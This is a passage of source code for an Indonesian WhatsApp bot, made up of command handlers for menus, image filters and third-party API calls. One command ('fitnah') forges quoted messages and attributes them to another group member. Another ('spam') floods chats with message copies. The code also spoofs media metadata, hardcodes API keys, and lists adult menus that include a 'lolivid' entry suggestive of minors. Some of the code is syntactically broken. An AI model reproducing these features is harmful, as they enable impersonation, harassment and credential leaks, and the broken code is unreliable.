"mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
"fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
"directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
"mediaKeyTimestamp": "1630826390",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
"viewOnce": true
 }
  }
}
 },
 "messageTimestamp": "1630826389",
 "status": "SERVER_ACK",
 "mediaData": {
"localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
 }
  }
  kahfzz.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": fakeimage}, MessageType.location, {quoted: ikymemek})
  break
  case 'kalender':
  teks1 = 
  reply(`🐣Day ${week} ${weton} 
🐥Date : ${date}
`) 
  break

  case 'textpro':
  tod22 = `
Wait Menu Akan Muncul Dalam 5 Detik Untuk Menghindari Spam!!
`
kahfzz.sendMessage(from, { contentText: `${tod22}`, footerText: ` © *_Kahfz Bot_*`,buttons: [{ buttonId: noprefix ? "yobang" : "!"+"yobang", buttonText: { displayText: 'OKE BANG 😎' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: 'SEWA BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
  await sleep(7000)
  if (!isRegistered) return reply(ind.only.daftarB)
 wibu = `
▹「 Text Pro Me 」
▹ ${prefix}blackpink text
▹ ${prefix}neon text
▹ ${prefix}greenneon text
▹ ${prefix}advanceglow text
▹ ${prefix}futureneon text
▹ ${prefix}sandwriting text
▹ ${prefix}sandsummer text
▹ ${prefix}sandengraved text
▹ ${prefix}metaldark text
▹ ${prefix}neonlight text
▹ ${prefix}holographic text
▹ ${prefix}text1917 text
▹ ${prefix}minion text
▹ ${prefix}deluxesilver text
▹ ${prefix}newyearcard text
▹ ${prefix}bloodfrosted text
▹ ${prefix}halloween text
▹ ${prefix}jokerlogo text
▹ ${prefix}fireworksparkle text
▹ ${prefix}natureleaves text
▹ ${prefix}bokeh text
▹ ${prefix}toxic text
▹ ${prefix}strawberry text
▹ ${prefix}box3d text
▹ ${prefix}roadwarning text
▹ ${prefix}breakwall text
▹ ${prefix}icecold text
▹ ${prefix}luxury text
▹ ${prefix}cloud text
▹ ${prefix}summersand text
▹ ${prefix}horrorblood text
▹ ${prefix}thunder text
▹ ${prefix}pornhub text1 text2
▹ ${prefix}glitch text1 text2
▹ ${prefix}avenger text1 text2
▹ ${prefix}space text1 text2
▹ ${prefix}ninjalogo text1 text2
▹ ${prefix}marvelstudio text1 text2
▹ ${prefix}lionlogo text1 text2
▹ ${prefix}wolflogo text1 text2
▹ ${prefix}steel3d text1 text2
▹ ${prefix}wallgravity text1 text2
 `
  sendButMessage(from, wibu, `created Kahfz_13`, [
  {
 buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK TO MENU `,
 },
 type: 1,
  },]);
  break
case 'nomornegara':
  if (!isRegistered) return reply(ind.only.daftarB)
 wibu = `
 *A*
Afganistan 93
Afrika Selatan 27
Afrika Tengah 236
Albania 355
Algeria (Aljazair) 213
Amerika Serikat 1
Andorra 376
Angola 244
Anguila 1-264
Antigua 1-268
Antillen Belanda 599
Arab Saudi 966
Argentina 54
Armenia 374
Aruba 297
Australia 61
Austria 43
Azerbaijan 994

*B*
Bahama 1-242
Bahrain 973
Bangladesh 880
Barbados 1-246
Barbuda 1-268
Belanda 31
Belarus 375
Belgia 32
Belize 501
Benin 229
Bermuda 1-441
Bhutan 975
Bolivia 591
Bosnia dan Herzegovina 387
Botswana 267
Brasil 55
Brunei Darussalam 673
Bulgaria 359
Burkina Faso 226
Burundi 257

*C*
Cape Verde 238
Ceko 420
Chad 235
Chili 56
Cina 86
Cina Makau 853

*D*
Denmark 45
Djibouti 253
Domikia 1-767

*E*
Ekuador 593
El Salvador 503
Eritrea 291
Estonia 372
Ethiopia 251

*F*
Fiji 679
Filipina 63
Finlandia 358

*G*
Gabon 241
Gambia 220
Georgia 995
Ghana 233
Gibraltar 350
Greenland 299
Grenada 1-473
Guam 1-671
Guatemala 502
Guinea 224
Guinea Bissau 245
Guinea Ekuator 240
Guyana 592

*H*
Haiti 509
Honduras 504
Hongaria 36
Hongkong 852

*I*
Indonesia 62
India 91
Inggris (Britania Raya) 44
Irak 964
Iran 98
Irlandia 353
Islandia 354
Israel 972
Italia 39

*J*
Jamaika 1-876
Jepang 81
Jerman 49
Jersey 44-1534

*K*
Kamboja 855
Kamerun 237
Kanada 1
Kazakhstan 7
Kenya 254
Kepulauan Marshall 692
Kepulauan Turks dan Caicos 1-649
Kirgizstan 996
Kiribati 686
Kolombia 57
Komoros 682
Korea Selatan 82
Korea Utara 850
Kosta Rika 506
Kroasia 385
Kuba 53
Kuwait 965
Kurakao 599

*L*
Laos 856
Latvia 371
Lebanon 961
Lesotho 266
Liberia 231
Libya 218
Liechtenstein 423
Lituania 370
Luksemburg 352

*M*
Madagaskar 261
Makedonia 389
Maladewa 960
Malawi 265
Malaysia 60
Mali 223
Malta 356
Maroko 212
Mauritania 222
Mauritius 230
Mayotte 262
Meksiko 52
Mesir 20
Mikronesia 691
Moldova 373
Monako 377
Mongolia 976
Montenegro 382
Mozambik 258
Myanmar 95

*N*
Namibia 264
Nauru 674
Nepal 977
Niger 227
Nigeria 234
Nikaragua 505
Niue 683
Norwegia 47

*O*
Oman 968

*P*
Pakistan 92
Palau 680
Palestina 970
Panama 507
Pantai Gading 225
Papua Nugini 675
Paraguay 595
Perancis 33
Perancis Polinesia 689
Peru 51
Pitcairn 64
Polandia 48
Portugal 351
Puerto Riko 1-787, 1-939
Pulau Cocos 61
Pulau Cook 682
Pulau Falkland 500
Pulau Faroe 298
Pulau Man 44-1624
Pulau Mariana Utara 1-670
Pulau Reuni 262
Pulau Solomon 677
Pulau Virgin 1-340

*Q*
Qatar 974

*R*
Republik Ceko 420
Republik Demokrasi Kongo 243
Republik Dominika 1-809, 1-829, 1-849
Rumania 40
Rusia 7
Rwanda 250

*S*
Sahara Barat 212
Santo Barthelemy 590
Santo Helena 290
Santo Kitts dan Nevis 1-869
Santo Lucia 1-758
Santo Vincent dan Grenadines 1-784
Samoa 685
San Marino 378
Sao Tome dan Principe 239
Selandia Baru 64
Senegal 221
Serbia 381
Seychelles 248
Sierra Leone 232
Singapura 65
Siprus 357
Slovenia 386
Slowakia 421
Somalia 252
Spanyol 34
Sri Lanka 94
Sudan 249
Sudan 211
Suriah 963
Suriname 597
Svalbard dan Jan Mayen 47
Swaziland 268
Swedia 46
Swiss 41

*T*
Tajikistan 992
Tanjung Verde 238
Tanzania 255
Taiwan 886
Thailand 66
Timor Leste 670
Togo 228
Tokelau 690
Tonga 676
Trinidad dan Tobago 1-868
Tunisia 216
Turki 90
Turkmenistan 993
Tuvalu 688

*U*
Uganda 256
Ukraina 380
Uni Emirat Arab 971
Uruguay 598
Uzbekistan 998

*V*
Vanuatu 678
Vatican 379
Venezuela 58
Vietnam 84

*W*
Walls dan Futuna 681

*Y*
Yaman 967
Yunani 30
Yordania 962

*Z*
Zambia 260
Zimbabwe 263
`
sendButMessage(from, wibu, `created Kahfz_13`, [
  {
 buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK TO MENU `,
 },
 type: 1,
  },]);
  break
  case 'fitnah':



  if (!isGroup) return reply('ONLY GRUP')  


 if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag&pesan&balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
var gh = body.slice(8)
 mentioned = kahfz.message.extendedTextMessage.contextInfo.mentionedJid
 var replace = gh.split("|")[0];
 var target = gh.split("|")[1];
 var bot = gh.split("|")[2];
 kahfzz.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
 break
 case 'wibu2':
 case 'nsfwanime':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `▹ MENU
▹ chiisaihentai
▹ trap
▹ blowjob
▹ yaoi
▹ ecchi
▹ hentai
▹ ahegao
▹ hololewd
▹ sideoppai
▹ animefeets
▹ animebooty
▹ animethighss
▹ hentaiparadise
▹ animearmpits
▹ hentaifemdom
▹ lewdanimegirls
▹ biganimetiddies
▹ animebellybutton
▹ hentai4everyone`
 sendButMessage(from, wibu, `created SUBSCRIBE KAHFZ BOT`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'randomimage':
 case 'randomimage':
 wibu = `
▹ MENU
▹ bj
▹ ero
▹ ppcp
▹ cum
▹ feet
▹ yuri
▹ trap
▹ lewd
▹ feed
▹ eron
▹ solo
▹ gasm
▹ poke
▹ anal
▹ holo
▹ tits
▹ kuni
▹ kiss
▹ erok
▹ smug
▹ baka
▹ solog
▹ feetg
▹ lewdk
▹ waifu
▹ pussy
▹ femdom
▹ cuddle
▹ hentai
▹ eroyuri
▹ cum_jpg
▹ blowjob
▹ erofeet
▹ holoero
▹ classic
▹ erokemo
▹ fox_girl
▹ futanari
▹ lewdkemo
▹ wallpaper
▹ pussy_jpg
▹ kemonomimi
▹ nsfw_avatar
▹ ngif
▹ nsfw_neko_gif
▹ random_hentai_gif`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
MessageType.buttonsMessage,{ quoted: ftrol, sendEphemeral: true, contextInfo:{"forwardingScore":999,"isForwarded":true, "externalAdReply":{"title": `Hai Kak ${pushname}`, "body": `YT : KirBotz×`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/daa8e7a3280efa76acce1.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/BH4ipz4O-sQ/`}}}
 break;

 case 'photoxy':
 case 'photooky':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `

▹ MENU
▹ shadow text
▹ cup text
▹ cup1 text
▹ romance text
▹ smoke text
▹ burnpaper text
▹ lovemessage text
▹ undergrass text
▹ love text
▹ coffe text
▹ woodheart text
▹ woodenboard text
▹ summer3d text
▹ wolfmetal text
▹ nature3d text
▹ underwater text
▹ golderrose text
▹ summernature text
▹ letterleaves text
▹ glowingneon text
▹ fallleaves text
▹ flamming text
▹ harrypotter text
▹ carvedwood text
▹ tiktok text1 text2
▹ arcade8bit text1 text2
▹ battlefield4 text1 text2
▹ pubg text1 text2`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'imfot1':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `
▹ MENU
▹infogempa
▹coronaindo
▹coronaglobal




*⚠️NOTE⚠️* :
FITUR HANYA 1 KARNA LAGI BIKIN CASE / TAHAP PENGEMBANGAN
`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'simi':
 if (args.length < 1) return reply('Textnya mana um?')
  teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break 
					case 'simih':
					
					if (args.length < 1) return reply('Hmmmm')
  if (Number(args[0]) === 1) {
if (isSimi) return reply('Mode simi sudah aktif')
  samih.push(from)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
reply('Sukses mengaktifkan mode simi di group ini ✔️')
 } else if (Number(args[0]) === 0) {
samih.splice(from, 1)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
reply('Sukes menonaktifkan mode simi di group ini ✔️')
 } else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
 }
 break
 case 'darkjoke': 

 buff = await getBuffer(`http://lolhuman.herokuapp.com/api/meme/darkjoke?apikey=PunyaIkyAds`, {method: 'get'})
 buttons = [{buttonId: noprefix ? "infoig" : "!"+"infoig",buttonText:{displayText: ` ©WhatsApp bot`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'SUBSCRIBE KAHFZ BOT', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)
 break
case 'tod':
const imagenya = (pepe) => {
            return {"url": "https://mmg.whatsapp.net/d/f/AvQZ55ZsZZyrhpWSfc6GFCrUg_TlTwso3wqpy1SjPJZH.enc","mimetype": "image/jpeg","caption": pepe,"fileSha256": "xdlK3ZjzXpwVfX1iXqUZEtb15jlgehEWlEV9EN5oYVY=","fileLength": "999999999999999","mediaKey": "ieif+9HzutyExM+9j0R0/V1rCDENo8gfyoNqNGzNyyg=","fileEncSha256": "dzW87sgUZAVc30wa9TdJXBazTrpLRBzgeu2dU6fO82w=","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgALQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAADBAACBQEBAAMBAQAAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADcoJaOhkuV0vY4uRZCScQNmQ6qjzE0AivlIwQKGrSCN/NVnLyOWlzLkWz2RGpjyE2HIKh5Cf/EACMQAAICAgIBBAMAAAAAAAAAAAECABEDEiExUQQjQWEQExT/2gAIAQEAAT8AOaocp+TU/r0NEEwepBgyk/EOUj4hBsGZjt0ZbxAS1kxTfRhPmOdUJiPZ7iITz2IRy1GYCRan8MNqE4TP9TEiKlL0Y+Ff2Uo+zGpMgHmbVwYzUa8x/TCuDzMAcKRcxuSzWJnR2pgOoW3i+7lHgRyAp8zAKUzTVzG6M0Y8pMQK0ZwzgGCkSKbY3MjUrxchW4jrUQHlpd0ZXuGeoYdCDEXUER8JQ7XEI1ingiOL67hwGvsxE1FT/8QAGBEAAgMAAAAAAAAAAAAAAAAAAREAECD/2gAIAQIBAT8AcZjOEaNnH//EABwRAAMAAwEBAQAAAAAAAAAAAAABAhEhMQMSEP/aAAgBAwEBPwCfOR+UHws8Fxk+lOh72VTVJIzukQ8jWW2SukYXRbn8+mf/2Q==",}
        }
        const buttonimg = (from, caption, button) => {
            let po = kahfzz.prepareMessageFromContent(from, { "templateMessage": { "hydratedTemplate": {"imageMessage": imagenya(caption), "hydratedContentText": caption, "hydratedFooterText": `${fake}`,"hydratedButtons": button }, "hydratedFourRowTemplate": {"imageMessage": imagenya(caption), "hydratedContentText": caption, "hydratedButtons": button }}}, {quoted: freply})
            return kahfzz.relayWAMessage(po, {waitForAck: true})
        }
                let yyoy = [
                    {
                        "urlButton": {
										"displayText": "Website",
										"url": "https://hardianto.xyz"
									},
									"index": 0
								},
								{
									"callButton": {
										"displayText": "Developer",
										"phoneNumber": "6285945151961@s.whatsapp.net"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Owner",
										"id": ".owner"
									},
									"index": 2
								},
								{
									"quickReplyButton": {
										"displayText": "Docs",
										"id": ".docs"
									},
									"index": 3
								},
								{
									"quickReplyButton": {
										"displayText": "T  O  S",
										"id": ".tos"
									},
                     }
                  ]
                buttonimg(from, `Hi ${pushname}`, yyoy)
                break
 case 'ephoto':
 case 'ephotomenu':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `

▹「 Ephoto 360 」
▹ wetglass text
▹ multicolor3d text
▹ watercolor text
▹ luxurygold text
▹ galaxywallpaper text
▹ lighttext text
▹ beautifulflower text
▹ puppycute text
▹ royaltext text
▹ heartshaped text
▹ birthdaycake text
▹ galaxystyle text
▹ hologram3d text
▹ greenneon text
▹ glossychrome text
▹ greenbush text
▹ metallogo text
▹ noeltext text
▹ glittergold text
▹ textcake text
▹ starsnight text
▹ wooden3d text
▹ textbyname text
▹ writegalacy text
▹ galaxybat text
▹ snow3d text
▹ birthdayday text
▹ goldplaybutton text
▹ silverplaybutton text
▹ freefire text`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'randomvideo':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `
「 Random Video 」

▹ ${prefix} lolivid
▹ ${prefix} asupan
▹ ${prefix} storyanime
▹ ${prefix} astetick
▹ ${prefix} videoanime
`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'wasted':
 var imgbb = require('imgbb-uploader')
 if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wasted?url=${data.display_url}&apikey=`)
kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
 } else {
reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wasted`)
 }
 break
 case 'tahta':
 buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${q}&apikey=IkyOgiwara`)
 buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: ` ©WhatsApp bot`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)
 break
 case 'quotesmaker':
 buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/quote-maker?text=${q}&apikey=IkyOgiwara`)
 kahfzz.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), quoted: freply})
 case 'tinyurl':
 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/tinyurl?url=${q}&apikey=IkyOgiwara`)
 kahfzz.sendMessage(from, `${anu.result}`, text, {quoted: freply})
 break
 case 'cuttly':
 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cuttly?url=${q}&apikey=IkyOgiwara`)
 kahfzz.sendMessage(from, `• Hasil: ${anu.result.hasil}\n• Dibuat Pada: ${anu.result.create_at}`, text, {quoted: freply})
 break
 case 'shorturl':
 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/shrturl?url=${q}&apikey=IkyOgiwara`)
 kahfzz.sendMessage(from, `${anu.result}`, text, {quoted: freply})
 break
 case 'imagemani':
 case 'imageefek':
 if (!isRegistered) return reply(ind.only.daftarB)
wibu = `
*IMAGE MANIPULATION*
 
▹ ${prefix}darkjoke
▹ ${prefix}meme
▹ ${prefix}joke
▹ ${prefix}wasted
▹ ${prefix}hitler
▹ ${prefix}wanted
▹ ${prefix}greyscale
▹ ${prefix}trash
▹ ${prefix}circle
▹ ${prefix}blur
▹ ${prefix}tinyurl
▹ ${prefix}cuttly
▹ ${prefix}affect
▹ ${prefix}picture`
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;

 case '18+':
 case 'porno':
 case '18':
 wibu = `
MENU INI BERISI FITUR 18+
SEBELUM MELANJUTKAN PASTIKAN ANDA BERUMUR 18+
 `
 sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: `${prefix}pornmenu`,
buttonText: {
  displayText: `⬡ LANJUTAN `,
},
type: 1,
},
{
 buttonId: `${prefix}nekopoi12`,
 buttonText: {
displayText: `⎙NEKOPOI APK  `,
 },
 type: 1,
 },
 {
buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK </  BALIK`,
 },
 type: 1,
 },]);
 break
case 'nekopoi12':
wibu = `
NIH TOD APK NYA 
*https://www.mediafire.com/file/j4k1zp153gf9jmt/base.7z/file*

*_NO PW_*  SUBREK CHANEEL KAHFZ BOT 
`
sendButMessage(from, wibu, `created Kahfz_13`, [
 {
buttonId: `${prefix}donasi`,
buttonText: {
  displayText: `⬡ DONASI 🧶 `,
},
type: 1,
 },]);
break
// Random Text //
  ///// LOLHUMAN API
  case 'spam':
  if (!kahfz.key.fromMe) return reply('FITUR INI KHUSUS OWNER BOT')
if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
 argsi = arg.split("|")
  if (!argsi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
 if (Number(argsi[1]) >= 1000000) return reply('Kebanyakan!')
if (isNaN(argsi[1])) return reply(`harus berupa angka`)
  for (let i = 0; i < argsi[1]; i++){
kahfzz.sendMessage(from, argsi[0], MessageType.text)
 }
 break



 case 'picture':
 var imgbb = require('imgbb-uploader')
 if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/picture?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}picture`)
}
break

case 'affect':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/affect?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}affect`)
}
break
case 'invert':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/invert?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}invert`)
}
break
case 'firework':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/img/firework?url=${data.display_url}&apikey=IkyOgiwara`)
  buff = await getBuffer(anu.result.url)
  kahfzz.sendMessage(from, buff, video, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}firework`)
}
break
case 'sepia':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/sepia?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}sepia`)
}
break
case 'blur':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/blur?url=${data.display_url}&level=20&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}blur`)
}
break
case 'circle':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/circle?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}circle`)
}
break
case 'trash':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/trash?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}trash`)
}
break
case 'wiki':
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wiki?kata=${q}&apikey=IkyOgiwara`)
kahfzz.sendMessage(from, `「 RESULT FOUND 」\n• Hasil Pencarian Dari: ${anu.result.from}\n• Hasil: ${anu.hasil}`, text, {quoted: freply})
break
case 'wanted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wanted?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wanted`)
}
break
case 'joke':
var imgbb = require('imgbb-uploader')
if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
  data = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
